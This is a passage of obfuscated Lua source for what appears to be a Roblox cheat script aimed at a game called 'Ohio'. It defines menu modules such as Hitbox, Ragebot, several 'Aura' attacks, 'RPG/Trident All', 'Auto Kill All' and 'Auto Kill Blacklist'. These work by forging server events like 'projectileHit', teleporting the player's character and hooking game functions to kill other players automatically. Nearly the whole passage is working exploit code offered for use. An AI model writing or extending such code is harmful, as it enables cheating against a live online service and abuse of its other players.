										return tbl31.MeleeAura.Module and tbl31.MeleeAura.Module:Get() or tbl31.StompAuraModule and tbl31.StompAuraModule:Get() or tbl31.GrabAuraModule and tbl31.GrabAuraModule:Get() or tbl31.HandcuffAuraModule and tbl31.HandcuffAuraModule:Get() or tbl31.Ragebot.Module and tbl31.Ragebot.Module:Get() or tbl31.RPG_TridentAll.Module and tbl31.RPG_TridentAll.Module:Get() or tbl31.Flame_AcidKillNearest and tbl31.Flame_AcidKillNearest:Get() or tbl31.SprayNearest and tbl31.SprayNearest:Get()
									end

									local function fn120()
										return fn119() or tbl31.MeleeAura.Vehicles or tbl31.Ragebot.Nextbot
									end

									local tbl33 = { guid = nil, itemGuid = nil, nextShootAt = 0 }
									local n7 = 0

									local tbl34 = {
										RPG = {
											event = "rocketHit",
											vfx = function(arg)
												fn106("baserocketexplosion", arg)
											end,
										},
										Trident = {
											event = "rocketHit",
											vfx = function(arg)
												fn106("baserocketexplosion", arg)
											end,
										},
										Flamethrower = {
											event = "flameHit",
											vfx = function(arg)
												fn106("carfire", arg)
											end,
										},
										["Acid Gun"] = {
											event = "acidHit",
											vfx = function(arg)
												fn106("acidCloud", arg)
											end,
										},
										["Pepper Spray"] = {
											event = "pepperSprayHit",
											vfx = function(arg)
												fn106("pepperspray", arg)
											end,
										},
										["Fire Extinguisher"] = {
											event = "pepperSprayHit",
											vfx = function(arg)
												fn106("pepperspray", arg)
											end,
										},
									}

									local function fn121(arg, arg2)
										local head = arg2 or arg.head
										return { hitSize = head.Size, hitPart = head, hitPlayerId = arg.plr.UserId, pos = head.Position }
									end

									local function fn122(arg, arg2, firemode)
										local v39 = fn109(arg, arg2)
										if #v39 == 0 then
											return nil
										end
										local firemode2 = arg.firemode

										if firemode then
											arg.firemode = firemode
										end

										local v40 = fn108(arg, v39)

										if firemode then
											arg.firemode = firemode2
										end

										if not v40 then
											return nil
										end
										return v39[1][1]
									end

									local function fn123(arg)
										local pos = arg and arg.pos
										local velocity = arg and arg.velocity
										if typeof(pos) ~= "Vector3" then
											return nil
										end

										if typeof(velocity) ~= "Vector3" or velocity.Magnitude <= 0.1 then
											return pos
										end
										return pos + velocity * Clamp((tonumber(arg.dist) or 0) / 800, 0.08, 0.35)
									end

									local function fn124(arg, arg2)
										local tbl35 = {}
										local tbl36 = {}

										for i = 1, #arg do
											if not tbl36[i] then
												local v39 = arg[i]
												local pos = v39.pos
												tbl36[i] = true
												local n8 = 1

												for i2 = i + 1, #arg do
													local v40 = arg[i2]

													if not tbl36[i2] and (v40.pos - v39.pos).Magnitude <= arg2 then
														tbl36[i2] = true
														pos += v40.pos
														n8 += 1
													end
												end

												Insert(tbl35, { pos = n8 == 1 and fn123(v39) or pos / n8 })
											end
										end

										return tbl35
									end

									local function fn125(arg, arg2)
										local now = tick()
										if now < n7 or not arg2[1] then
											return
										end
										n7 = now + (tonumber(tbl31.RPG_TridentAll.Delay) or 0.2)
										local guid = tbl33.guid

										if not guid or tbl33.itemGuid ~= arg.guid or now >= tbl33.nextShootAt then
											guid = fn122(arg, arg2[1].head)
											if not guid then
												return
											end
											tbl33.guid = guid
											tbl33.itemGuid = arg.guid
											tbl33.nextShootAt = now + 20
										end

										local v39 = tbl34[arg.name]
										local position = fn71()
										position = position and position.Position
										local v40 = fn124(arg2, 10)

										for i = 1, #v40 do
											local v41 = v40[i]

											if v41.pos and (not position or (v41.pos - position).Magnitude > 15) then
												FireServer(v39.event, guid, guid, v41.pos)
												v39.vfx(v41.pos)
											end
										end

										FireServer("projectileHit", guid, "player", fn121(arg2[1], arg2[1].head))
										fn107(arg)
									end

									local function fn126(arg, arg2)
										if not arg2 then
											return
										end
										local head = arg2.head
										local v39 = fn122(arg, head, arg.name == "Acid Gun" and "semi" or "auto")
										if not v39 then
											return
										end
										local v40 = tbl34[arg.name]

										for i = 1, 3 do
											local position = head.Position
											FireServer(v40.event, v39, GUID(), position)
										end

										FireServer("projectileHit", v39, "player", fn121(arg2, head))
										v40.vfx(head.Position)
										fn107(arg)
									end

									local function fn127(arg, arg2)
										if not arg2 then
											return
										end
										local head = arg2.head
										local v39 = fn122(arg, head, "auto")
										if not v39 then
											return
										end
										FireServer("pepperSprayHit", v39, "player", fn121(arg2, head))
										tbl34[arg.name].vfx(head.Position)
										fn107(arg)
									end

									local tbl35 = {}

									local function fn128()
										local tbl36 = {}
										local v39 = nil
										local v40 = nil
										local v41

										for i = 1, fn101() do
											if v33[7][v33[6] + i] and v29[7][v29[6] + i] and v29[7][v29[6] + i].Health > 0 then
												local v42 = v34[7][v34[6] + i]
												local v43 = v28[7][v28[6] + i]
												local v44 = v29[7][v29[6] + i]
												local v45 = v30[7][v30[6] + i]
												v39 = v39 or v42
												v40 = v40 or v43
												v41 = v41 or v44

												Insert(tbl36, {
													plr = v42,
													pos = v45.Position,
													hrp = v45,
													velocity = v45.AssemblyLinearVelocity or v45.Velocity,
													head = v31[7][v31[6] + i],
													dist = v32[7][v32[6] + i],
												})
											end
										end

										return tbl36, v39, v40, v41
									end

									local function fn129(arg, arg2)
										if not arg() then
											return
										end

										Insert(tbl35, Spawn(function()
											while arg() do
												arg2()
												Wait()
											end
										end))
									end

									local function fn130()
										for i = 1, #tbl35 do
											local v39 = tbl35[i]

											if v39 then
												Cancel(v39)
											end
										end

										table.clear(tbl35)
										if not fn120() then
											return
										end

										fn129(function()
											return tbl31.MeleeAura.Module and tbl31.MeleeAura.Module:Get()
										end, function()
											if not fn71() then
												return
											end

											for i = 1, fn101() do
												if v33[7][v33[6] + i] then
													local v39 = v34[7][v34[6] + i]

													if v32[7][v32[6] + i] <= 14 and v29[7][v29[6] + i].Health > 5 then
														local Fists = fn72("Fists")

														if Fists then
															local guid = Fists.guid
															local brassKnuckles = fn72("Brass Knuckles")
															local str3 = "meleemegapunch"

															if tbl31.BreakVest then
																if not brassKnuckles and not fn87(LocalPlayer) then
																	fn93("Brass Knuckles")
																end

																if brassKnuckles then
																	guid = brassKnuckles.guid
																	str3 = "meleepunch"
																end
															end

															if fn87(v39) then
																str3 = "meleepunch"
															end

															fn96(guid, str3, v39)
														end
													end
												end
											end
										end)

										fn129(function()
											return tbl31.StompAuraModule and tbl31.StompAuraModule:Get()
										end, function()
											if not fn71() then
												return
											end

											for i = 1, fn101() do
												if v33[7][v33[6] + i] then
													local v39 = v34[7][v34[6] + i]
													local v40 = v32[7][v32[6] + i]

													if v40 <= 30 and fn87(v39) then
														if v40 <= 14 then
															fn97(v39)
														else
															fn98(v39)
															fn97(v39)
														end
													end
												end
											end
										end)

										fn129(function()
											return tbl31.GrabAuraModule and tbl31.GrabAuraModule:Get()
										end, function()
											if not fn71() then
												return
											end

											for i = 1, fn101() do
												if v33[7][v33[6] + i] then
													local v39 = v34[7][v34[6] + i]

													if v32[7][v32[6] + i] <= 30 and fn87(v39) then
														fn98(v39)

														if tbl31.GrabAuraDrop then
															fn99(v39)
														end
													end
												end
											end
										end)

										fn129(function()
											return tbl31.HandcuffAuraModule and tbl31.HandcuffAuraModule:Get()
										end, function()
											if not fn71() then
												return
											end

											for i = 1, fn101() do
												if v33[7][v33[6] + i] then
													local v39 = v34[7][v34[6] + i]

													if v32[7][v32[6] + i] <= 30 and fn87(v39) and not ClientReplicator.Get(v39, "cuffed") then
														fn100(v39)
													end
												end
											end
										end)

										fn129(function()
											return tbl31.MeleeAura.Vehicles
										end, function()
											if not fn71() then
												return
											end
											local Fists = fn72("Fists")
											local v39 = Fists and fn102()[1]

											if v39 and v39.dist <= 15 then
												fn96(Fists.guid, "meleemegapunch", v39.model)
											end
										end)

										fn129(function()
											return tbl31.Ragebot.Module and tbl31.Ragebot.Module:Get()
										end, function()
											if not fn71() then
												return
											end
											local v39, v40, v41, v42 = fn128()
											local v43 = fn74(LocalPlayer)

											if v40 and v41 and v43 and v43.type == "Gun" and v42 and v42.Health > 0 and not tbl34[v43.name] then
												fn110(v43, v40, v41.Head)
											end
										end)

										fn129(function()
											return tbl31.RPG_TridentAll.Module and tbl31.RPG_TridentAll.Module:Get()
										end, function()
											if not fn71() then
												return
											end
											local v39, v40, v41, v42 = fn128()
											local v43 = fn74(LocalPlayer)

											if v40 and v41 and v43 and v43.type == "Gun" and v42 and v42.Health > 0 and (v43.name == "RPG" or v43.name == "Trident") then
												fn125(v43, v39)
											end
										end)

										fn129(function()
											return tbl31.Flame_AcidKillNearest and tbl31.Flame_AcidKillNearest:Get()
										end, function()
											if not fn71() then
												return
											end
											local v39, v40, v41, v42 = fn128()
											local v43 = fn74(LocalPlayer)

											if v40 and v41 and v43 and v43.type == "Gun" and v42 and v42.Health > 0 and (v43.name == "Flamethrower" or v43.name == "Acid Gun") then
												fn126(v43, v39[1])
											end
										end)

										fn129(function()
											return tbl31.SprayNearest and tbl31.SprayNearest:Get()
										end, function()
											if not fn71() then
												return
											end
											local v39, v40, v41, v42 = fn128()
											local v43 = fn74(LocalPlayer)

											if v40 and v41 and v43 and v43.type == "Gun" and v42 and v42.Health > 0 and (v43.name == "Pepper Spray" or v43.name == "Fire Extinguisher") then
												fn127(v43, v39[1])
											end
										end)

										fn129(function()
											return tbl31.Ragebot.Nextbot
										end, function()
											if not fn71() then
												return
											end
											local v39 = fn74(LocalPlayer)
											local v40 = FindFirstChild(workspace, "NextBots") and GetChildren(workspace.NextBots)[1]

											if v39 and v40 and v39.type == "Gun" and v39.name ~= "RPG" then
												local primaryPart = FindFirstChild(v40, "Hitbox") or v40.PrimaryPart

												if primaryPart then
													local v41 = fn109(v39, primaryPart)

													if #v41 > 0 then
														fn108(v39, v41)
													end
												end
											end
										end)
									end

									local tbl36 = {}

									local function fn131()
										for i = 1, #tbl36 do
											local v39 = tbl36[i]

											if v39 then
												Cancel(v39)
											end
										end

										table.clear(tbl36)

										if tbl31.AutoVest.Module:Get() then
											Insert(tbl36, Spawn(function()
												while tbl31.AutoVest.Module:Get() do
													if not fn69() or not fn70() or fn87(LocalPlayer) then
														Wait()
													else
														if not GetAttribute(LocalPlayer, "armor") or GetAttribute(LocalPlayer, "armor") and GetAttribute(LocalPlayer, "armor") < 30 then
															for i = 1, #tbl10 do
																local v39 = tbl10[i]

																for i2 = 1, 2 do
																	local v40 = fn72(v39)

																	if v40 then
																		fn76(v40.guid)
																		FireServer("useConsumable", v40.guid)
																		fn77(v40.guid)
																		fn93(tbl31.AutoVest.Vest)
																		break
																	else
																		fn93(tbl31.AutoVest.Vest)
																	end
																end
															end
														end

														Wait()
													end
												end
											end))
										end

										if tbl31.AutoHealModule:Get() then
											Insert(tbl36, Spawn(function()
												while tbl31.AutoHealModule:Get() do
													if not fn69() or not fn70() or fn87(LocalPlayer) then
														Wait()
													else
														local v39 = fn70()

														if v39 and v39.Health < v39.MaxHealth then
															local tbl37 = { "Bandage", "Beans" }

															for i = 1, #tbl37 do
																local v40 = tbl37[i]

																for i2 = 1, 2 do
																	local v41 = fn72(v40)

																	if v41 then
																		fn93(v40, true)
																		fn76(v41.guid)
																		FireServer("useConsumable", v41.guid)

																		if v41.ammoManager and v41.ammoManager.ammo < 1 then
																			fn77(v41.guid)
																			fn93(v40)
																		end

																		break
																	else
																		fn93(v40)
																	end
																end
															end
														end

														Wait()
													end
												end
											end))
										end
									end

									tbl31.Hitbox.Module = v36:CreateModule({
										Id = "ohio-hitbox",
										Name = "Hitbox",
										Callback = function(arg)
											fn130()

											if arg then
												fn118()
												fn115()
											else
												fn117()
												fn116()
											end
										end,
									})

									tbl31.Hitbox.Module:CreateKeybind({
										Id = "ohio-hitbox-keybind",
										Name = "Keybind",
										Callback = function()
											tbl31.Hitbox.Module:Set(not tbl31.Hitbox.Module:Get())
										end,
									})

									tbl31.Hitbox.Module:CreateSelector({
										Id = "ohio-hitbox-part",
										Name = "Part",
										Options = { { Value = "Head" }, { Value = "Body" }, { Value = "Random" } },
										Default = tbl31.Hitbox.Part,
										Callback = function(part)
											tbl31.Hitbox.Part = part
										end,
									})

									tbl31.Hitbox.Module:CreateSlider({
										Id = "ohio-hitbox-hit-chance",
										Name = "Hit Chance",
										Min = 0,
										Max = 100,
										Default = tbl31.Hitbox.HitChance,
										Step = 1,
										Callback = function(hitChance)
											tbl31.Hitbox.HitChance = hitChance
										end,
									})

									tbl31.Hitbox.Module:CreateSlider({
										Id = "ohio-hitbox-size",
										Name = "Size",
										Min = 1,
										Max = 100,
										Default = 3,
										Step = 0.1,
										Callback = function(size)
											tbl31.Hitbox.Size = size
											fn115()
										end,
									})

									tbl31.Hitbox.Module:CreateSlider({
										Id = "ohio-hitbox-transparency",
										Name = "Transparency",
										Min = 0,
										Max = 1,
										Default = tbl31.Hitbox.Transparency,
										Step = 0.1,
										Callback = function(transparency)
											tbl31.Hitbox.Transparency = transparency
											fn115()
										end,
									})

									tbl31.Hitbox.Module:CreateColorPicker({
										Id = "ohio-hitbox-color",
										Name = "Color",
										Default = tbl31.Hitbox.Color,
										Callback = function(color)
											tbl31.Hitbox.Color = color
											fn115()
										end,
									})

									tbl31.MeleeAura.Module = v36:CreateModule({
										Id = "ohio-melee-aura",
										Name = "Melee Aura",
										Callback = function()
											fn130()
										end,
									})

									tbl31.MeleeAura.Module:CreateToggle({
										Id = "ohio-melee-aura-vehicles",
										Name = "Vehicles",
										Default = tbl31.MeleeAura.Vehicles,
										Callback = function(vehicles)
											tbl31.MeleeAura.Vehicles = vehicles
											fn130()
										end,
									})

									tbl31.MeleeAura.Module:CreateToggle({
										Id = "ohio-melee-aura-break-vest",
										Name = "Break Vest",
										Default = tbl31.BreakVest,
										Callback = function(breakVest)
											tbl31.BreakVest = breakVest
										end,
									})

									tbl31.StompAuraModule = v36:CreateModule({
										Id = "ohio-stomp-aura",
										Name = "Stomp Aura",
										Callback = function()
											fn130()
										end,
									})

									tbl31.StompAuraModule:CreateKeybind({
										Id = "ohio-stomp-aura-keybind",
										Name = "Keybind",
										Callback = function()
											tbl31.StompAuraModule:Set(not tbl31.StompAuraModule:Get())
										end,
									})

									tbl31.GrabAuraModule = v36:CreateModule({
										Id = "ohio-grab-aura",
										Name = "Grab Aura",
										Callback = function()
											fn130()
										end,
									})

									tbl31.GrabAuraModule:CreateKeybind({
										Id = "ohio-grab-aura-keybind",
										Name = "Keybind",
										Callback = function()
											tbl31.GrabAuraModule:Set(not tbl31.GrabAuraModule:Get())
										end,
									})

									tbl31.GrabAuraModule:CreateToggle({
										Id = "ohio-grab-aura-drop",
										Name = "Drop",
										Default = tbl31.GrabAuraDrop,
										Callback = function(grabAuraDrop)
											tbl31.GrabAuraDrop = grabAuraDrop
										end,
									})

									tbl31.HandcuffAuraModule = v36:CreateModule({
										Id = "ohio-handcuff-aura",
										Name = "Handcuff Aura",
										Callback = function()
											fn130()
										end,
									})

									tbl31.HandcuffAuraModule:CreateKeybind({
										Id = "ohio-handcuff-aura-keybind",
										Name = "Keybind",
										Callback = function()
											tbl31.HandcuffAuraModule:Set(not tbl31.HandcuffAuraModule:Get())
										end,
									})

									local v39 = nil
									local v40 = nil
									local n8 = 3

									local v41 = v36:CreateModule({
										Id = "ohio-shake-aura",
										Name = "Shake Aura",
										Callback = function(arg)
											v39 = arg
											pcall(task.cancel, v40)

											v40 = Spawn(function()
												while v39 and Wait() do
													for i = 1, fn101() do
														if not v33[7][v33[6] + i] then
															continue
														else
															local v41 = v34[7][v34[6] + i]

															if not (v29[7][v29[6] + i].Health > 0) then
																continue
															else
																fn99(v41)
																if not (n8 <= i) then
																	continue
																end
															end
														end

														break
													end
												end
											end)
										end,
									})

									v41:CreateKeybind({
										Id = "ohio-shake-aura-keybind",
										Name = "Keybind",
										Callback = function()
											v41:Set(not v41:Get())
										end,
									})

									v41:CreateSlider({
										Id = "ohio-shake-aura-max-target",
										Name = "Max Target",
										Min = 1,
										Max = 10,
										Default = n8,
										Step = 1,
										Callback = function(arg)
											n8 = arg
										end,
									})

									tbl31.AutoVest.Module = v36:CreateModule({
										Id = "ohio-auto-vest",
										Name = "Auto Vest",
										Callback = function(arg)
											fn131()

											if arg then
												fn93(tbl31.AutoVest.Vest)
											end
										end,
									})

									tbl31.AutoVest.Module:CreateKeybind({
										Id = "ohio-auto-vest-keybind",
										Name = "Keybind",
										Callback = function()
											tbl31.AutoVest.Module:Set(not tbl31.AutoVest.Module:Get())
										end,
									})

									tbl31.AutoVest.Module:CreateSelector({
										Id = "ohio-auto-vest-vest",
										Name = "Vest",
										Options = { { Value = "Light Vest" }, { Value = "Medium Vest" }, { Value = "Heavy Vest" } },
										Default = tbl31.AutoVest.Vest,
										Callback = function(vest)
											tbl31.AutoVest.Vest = vest
										end,
									})

									tbl31.AutoHealModule = v36:CreateModule({
										Id = "ohio-auto-heal",
										Name = "Auto Heal",
										Callback = function(arg)
											fn131()

											if arg then
												fn93("Bandage")
												fn93("Beans")
											end
										end,
									})

									tbl31.AutoHealModule:CreateKeybind({
										Id = "ohio-auto-heal-keybind",
										Name = "Keybind",
										Callback = function()
											tbl31.AutoHealModule:Set(not tbl31.AutoHealModule:Get())
										end,
									})

									tbl31.Ragebot.Module = v36:CreateModule({
										Id = "ohio-ragebot",
										Name = "Ragebot",
										Callback = function()
											fn130()
										end,
									})

									tbl31.Ragebot.Module:CreateKeybind({
										Id = "ohio-ragebot-keybind",
										Name = "Keybind",
										Callback = function()
											tbl31.Ragebot.Module:Set(not tbl31.Ragebot.Module:Get())
										end,
									})

									tbl31.Ragebot.Module:CreateToggle({
										Id = "ohio-ragebot-nextbot",
										Name = "Nextbot",
										Default = tbl31.Ragebot.Nextbot,
										Callback = function(nextbot)
											tbl31.Ragebot.Nextbot = nextbot
											fn130()
										end,
									})

									tbl31.RPG_TridentAll.Module = v36:CreateModule({
										Id = "ohio-rpg-trident-all",
										Name = "RPG/Trident All",
										Callback = function()
											fn130()
										end,
									})

									tbl31.RPG_TridentAll.Module:CreateKeybind({
										Id = "ohio-rpg-trident-all-keybind",
										Name = "Keybind",
										Callback = function()
											tbl31.RPG_TridentAll.Module:Set(not tbl31.RPG_TridentAll.Module:Get())
										end,
									})

									tbl31.RPG_TridentAll.Module:CreateSlider({
										Id = "ohio-rpg-trident-all-delay",
										Name = "Delay",
										Min = 0.2,
										Max = 1,
										Default = tbl31.RPG_TridentAll.Delay,
										Step = 0.1,
										Callback = function(delay)
											tbl31.RPG_TridentAll.Delay = delay
										end,
									})

									tbl31.Flame_AcidKillNearest = v36:CreateModule({
										Id = "ohio-flame-acid-nearest",
										Name = "Flame/Acid Nearest",
										Callback = function()
											fn130()
										end,
									})

									tbl31.Flame_AcidKillNearest:CreateKeybind({
										Id = "ohio-flame-acid-kill-nearest-keybind",
										Name = "Keybind",
										Callback = function()
											tbl31.Flame_AcidKillNearest:Set(not tbl31.Flame_AcidKillNearest:Get())
										end,
									})

									tbl31.SprayNearest = v36:CreateModule({
										Id = "ohio-spray-nearest",
										Name = "Spray Nearest",
										Callback = function()
											fn130()
										end,
									})

									tbl31.SprayNearest:CreateKeybind({
										Id = "ohio-spray-nearest-keybind",
										Name = "Keybind",
										Callback = function()
											tbl31.SprayNearest.Module:Set(not tbl31.SprayNearest.Module:Get())
										end,
									})
								end

								fn112()
								local v37 = v14:CreateTab({ Id = "ohio-target", Name = "Target" })

								local function fn113()
									local n7 = 8

									TargetState = {
										AutoCounterAtk = false,
										AutoCounterOnAttack = false,
										AutoKlAll = false,
										AutoKlBlacklist = false,
										Method = "Melee",
										IFF = true,
										HideInterval = 0.1,
									}

									local function fn114()
										return not PlayerList.HasBlacklist or PlayerList:HasBlacklist()
									end

									local function fn115()
										return TargetState.AutoKlAll or TargetState.AutoKlBlacklist and fn114()
									end

									local function fn116(arg)
										if typeof(arg) == "table" then
											arg = arg.Value or arg.Title or arg.Name
										end

										if arg == "Gun" then
											return "Gun"
										end
										return "Melee"
									end

									local function fn117(arg, arg2, arg3, arg4, arg5)
										if not arg or arg == LocalPlayer or not arg2 or not arg3 or not arg4 or not arg5 then
											return false
										end

										if arg3.Health <= 0 or GetAttribute(arg, "isSpawned") == false then
											return false
										end

										if TargetState.IFF and FindFirstChildOfClass(arg2, "ForceField") then
											return false
										end

										if TargetState.AutoKlAll then
											return true
										end
										return TargetState.AutoKlBlacklist and fn114() and CheckState(arg) == true
									end

									local v38 = nil

									local function fn118()
										if not TargetState.AutoKlBlacklist then
											return false
										end
										return fn116(TargetState.Method) == "Gun"
									end

									local function fn119()
										local v39 = fn71()
										if not v39 then
											return
										end

										if not ohioTargetReturnCFrame then
											ohioTargetReturnCFrame = v39.CFrame
										end

										if not v38 then
											local function fn120()
												return (Random() * 2 - 1) * 99999
											end

											local v40 = NewCFrame
											local v41 = fn120()
											local n8 = Random() * 99999
											local v42 = fn120()
											v38 = v40(v41, n8, v42)
										end

										v39.CFrame = v38
										v39.AssemblyLinearVelocity = EmptyVector3
										v39.AssemblyAngularVelocity = EmptyVector3
									end

									local function fn120()
										v38 = nil
										if not ohioTargetReturnCFrame then
											return
										end
										local v39 = fn71()
										if not v39 then
											return
										end
										v39.CFrame = ohioTargetReturnCFrame
										v39.AssemblyLinearVelocity = EmptyVector3
										v39.AssemblyAngularVelocity = EmptyVector3
										ohioTargetReturnCFrame = nil
									end

									local function fn121()
										local v39 = GetPlayerList()

										for i = 1, #v39 do
											local v40 = v39[i]

											if v40 ~= LocalPlayer and GetAttribute(v40, "isSpawned") ~= false then
												if TargetState.AutoKlAll then
													return true
												end

												if TargetState.AutoKlBlacklist and fn114() and CheckState(v40) == true then
													return true
												end
											end
										end

										return false
									end

									local function fn122(arg, arg2, arg3, arg4)
										local v39 = fn116(TargetState.Method)

										if v39 == "Melee" then
											local Fists = fn72("Fists")
											if not Fists then
												return
											end
											local v40 = fn71()

											if v40 and arg3 then
												v40.CFrame = arg3.CFrame * NewCFrame(0, -3, 0)
												v40.AssemblyLinearVelocity = EmptyVector3
												v40.AssemblyAngularVelocity = EmptyVector3
											end

											if fn96(Fists.guid, "meleemegapunch", arg) then
												fn97(arg)
											end
										elseif v39 == "Gun" then
											local Raygun = fn74(LocalPlayer) or fn72("Raygun")

											if Raygun and Raygun.type == "Gun" then
												for i = 1, 3 do
													Spawn(fn110, Raygun, arg, arg4)
												end

												fn107(Raygun)
											elseif not fn87(LocalPlayer) then
												Spawn(fn93, "Raygun")
											end
										end
									end

									local function fn123()
										pcall(task.cancel, ohioTargetTask)
										ohioTargetTask = nil
										if not fn115() then
											fn120()
											return
										end
										ohioTargetTask = Spawn(function(...) end)
									end

									ohioStartTargetWorker = fn123

									local function fn124(arg)
										if not TargetState.AutoCounterAtk or not arg or arg == LocalPlayer then
											return
										end
										local v39 = getthreadidentity and getthreadidentity() or nil
										pcall(setthreadidentity, oldTI or 8)
										pcall(PlayerList.SetState, PlayerList, arg, "Blacklist")
										pcall(fn7, "Auto Counter", arg.Name, 3)
										fn123()

										if v39 ~= nil then
											pcall(setthreadidentity, v39)
										end
									end

									local v39 = nil
									local v40 = nil

									local function fn125(arg)
										if typeof(arg) ~= "Instance" then
											return nil
										end

										if IsA(arg, "Player") then
											return arg
										end

										while arg do
											if IsA(arg, "Model") then
												local playerFromCharacter = Players:GetPlayerFromCharacter(arg)
												if playerFromCharacter then
													return playerFromCharacter
												end
											end

											arg = arg.Parent
										end

										return nil
									end

									local function fn126(arg)
										if arg == nil then
											return nil
										end

										if typeof(arg) == "Instance" then
											if IsA(arg, "Player") then
												return arg
											end
											return fn125(arg)
										end

										if type(arg) == "number" then
											return Players:GetPlayerByUserId(arg)
										end
										local str3 = tostring(arg)
										local v41 = FindFirstChild(Players, str3)
										if v41 and IsA(v41, "Player") then
											return v41
										end
										local v42 = GetPlayerList()

										for i = 1, #v42 do
											local v43 = v42[i]
											if v43.Name == str3 or v43.DisplayName == str3 then
												return v43
											end
										end

										return nil
									end

									local function fn127(arg)
										if typeof(arg) ~= "Vector3" then
											return nil
										end
										local v41 = GetPlayerList()
										local huge = math.huge
										local v42

										for i = 1, #v41 do
											local v43 = v41[i]

											if v43 ~= LocalPlayer then
												local character = v43.Character

												if character then
													character = FindFirstChild(character, "HumanoidRootPart") or character.PrimaryPart
												end

												if character then
													local magnitude = (character.Position - arg).Magnitude

													if magnitude < huge then
														huge = magnitude
														v42 = v43
													end
												end
											end
										end

										return v42
									end

									local function fn128(arg)
										if typeof(arg) == "Vector3" then
											return arg
										end

										if typeof(arg) == "CFrame" then
											return arg.Position
										end

										if typeof(arg) ~= "Instance" then
											return nil
										end

										if IsA(arg, "BasePart") then
											return arg.Position
										end

										if IsA(arg, "Model") then
											local primaryPart = FindFirstChild(arg, "HumanoidRootPart") or arg.PrimaryPart
											return primaryPart and primaryPart.Position or nil
										end

										if IsA(arg, "Player") then
											local character = arg.Character

											if character then
												character = FindFirstChild(character, "HumanoidRootPart") or character.PrimaryPart
											end

											return character and character.Position or nil
										end

										return nil
									end

									local function fn129(arg)
										local v41 = fn125(arg)
										if v41 and v41 ~= LocalPlayer then
											return v41
										end
										local v42 = fn128(arg)
										local v43 = fn71()
										if v43 and v42 and (v42 - v43.Position).Magnitude <= n7 then
											return fn127(v43.Position)
										end
										return fn127(v42)
									end

									local function fn130(arg, ...)
										local v41 = table.pack(...)

										for i = 1, select("#", ...) do
											local v42 = fn125(select(i, table.unpack(v41, 1, v41.n)))
											if v42 and v42 ~= LocalPlayer then
												v39 = v42
												return v42
											end
										end

										local v42 = fn129(arg)
										if v42 and v42 ~= LocalPlayer then
											v39 = v42
											return v42
										end
										local v43 = v39
										local flag4 = v39

										if v43 then
											flag4 = v43 ~= LocalPlayer
										end

										if flag4 and Players:GetPlayerByUserId(v43.UserId) then
											return v43
										end
										return nil
									end

									local function fn131(arg, ...)
										if not TargetState.AutoCounterAtk then
											return
										end
										local v41 = table.pack(...)
										local v42 = fn130
										v41.n = 2 + v41.n - 1
										table.move(v41, 1, v41.n, 2, v41)
										v41[1] = arg
										fn124(v42(table.unpack(v41, 1, v41.n)))
									end

									local function fn132()
										local v41 = FindFirstChild(LocalPlayer.PlayerGui, "DamageIndicator")
										local v42 = v41 and FindFirstChild(v41, "Frame")
										local v43 = v42 and FindFirstChildWhichIsA(v42, "ImageLabel")
										return v43 ~= nil and v43.ImageTransparency < 1
									end

									local function fn133(arg)
										if v40 then
											Disconnect(v40)
											v40 = nil
										end

										local v41 = arg and FindFirstChildOfClass(arg, "Humanoid")
										if not v41 then
											return
										end
										local health = v41.Health

										v40 = Connect(v41.HealthChanged, function(arg2)
											local flag4 = arg2 < health
											health = arg2

											if flag4 and TargetState.AutoCounterOnAttack and fn132() then
												fn131(nil)
											end
										end)
									end

									if LocalPlayer.Character then
										fn133(LocalPlayer.Character)
									end

									Connect(LocalPlayer.CharacterAdded, fn133)

									if DamageIndicator and type(DamageIndicator.Show) == "function" then
										local show = DamageIndicator.Show

										DamageIndicator.Show = function(arg, arg2)
											if TargetState.AutoCounterOnAttack then
												fn131(arg)
											end

											return show(arg, arg2)
										end
									end

									Spawn(LinkSignal, "playerHit", function(arg, ...)
										if not TargetState.AutoCounterOnAttack then
											return
										end
										fn131(arg, ...)
									end)

									local v41 = v37:CreateModule({
										Id = "ohio-auto-counter",
										Name = "Auto Counter",
										Default = TargetState.AutoCounterAtk,
										Callback = function(autoCounterAtk)
											TargetState.AutoCounterAtk = autoCounterAtk

											if autoCounterAtk and autoKillBlacklistModule and not TargetState.AutoKlBlacklist then
												autoKillBlacklistModule:Set(true)
											end
										end,
									})

									v41:CreateKeybind({
										Id = "ohio-auto-counter-keybind",
										Name = "Keybind",
										Callback = function()
											v41:Set(not v41:Get())
										end,
									})

									v41:CreateToggle({
										Id = "ohio-auto-counter-on-attack",
										Name = "On Attack",
										Default = TargetState.AutoCounterOnAttack,
										Callback = function(autoCounterOnAttack)
											TargetState.AutoCounterOnAttack = autoCounterOnAttack
										end,
									})

									local v42 = v37:CreateModule({
										Id = "ohio-auto-kill-all",
										Name = "Auto Kill All",
										Default = TargetState.AutoKlAll,
										Callback = function(autoKlAll)
											TargetState.AutoKlAll = autoKlAll
											fn123()
										end,
									})

									v42:CreateKeybind({
										Id = "ohio-auto-kill-all-keybind",
										Name = "Keybind",
										Callback = function()
											v42:Set(not v42:Get())
										end,
									})

									autoKillBlacklistModule = v37:CreateModule({
										Id = "ohio-auto-kill-blacklist",
										Name = "Auto Kill Blacklist",
										Default = TargetState.AutoKlBlacklist,
										Callback = function(autoKlBlacklist)
											TargetState.AutoKlBlacklist = autoKlBlacklist
											fn123()
										end,
									})

									autoKillBlacklistModule:CreateKeybind({
										Id = "ohio-auto-kill-blacklist-keybind",
										Name = "Keybind",
										Callback = function()
											autoKillBlacklistModule:Set(not autoKillBlacklistModule:Get())
										end,
									})

									autoKillBlacklistModule:CreateSlider({
										Id = "ohio-auto-kill-blacklist-hide-interval-ms",
										Name = "Hide Delay",
										Min = 50,
										Max = 500,
										Default = TargetState.HideInterval * 1000,
										Step = 10,
										Callback = function(arg)
											TargetState.HideInterval = arg / 1000
										end,
									})

									LinkSignal("killMessage", function(arg)
										if not v41:Get() then
											return
										end
										TargetState.AutoCounterAtk = true

										if autoKillBlacklistModule and not TargetState.AutoKlBlacklist then
											autoKillBlacklistModule:Set(true)
										end

										local v43 = fn126(arg)

										if v43 and v43 ~= LocalPlayer then
											fn124(v43)
										end
									end)

									v37:CreateModule({ Id = "ohio-target-kill-method", Name = "Kill Method" }):CreateSelector({
										Id = "ohio-kill-method",
										Name = "Method",
										Options = { "Melee", "Gun" },
										Default = TargetState.Method,
										Callback = function(arg)
											TargetState.Method = fn116(arg)
											fn123()
										end,
									})

									local v43 = v37:CreateModule({
										Id = "ohio-ignore-force-field",
										Name = "Ignore Force Field",
										Default = TargetState.IFF,
										Callback = function(iff)
											TargetState.IFF = iff
										end,
									})

									v43:CreateKeybind({
										Id = "ohio-iff-keybind",
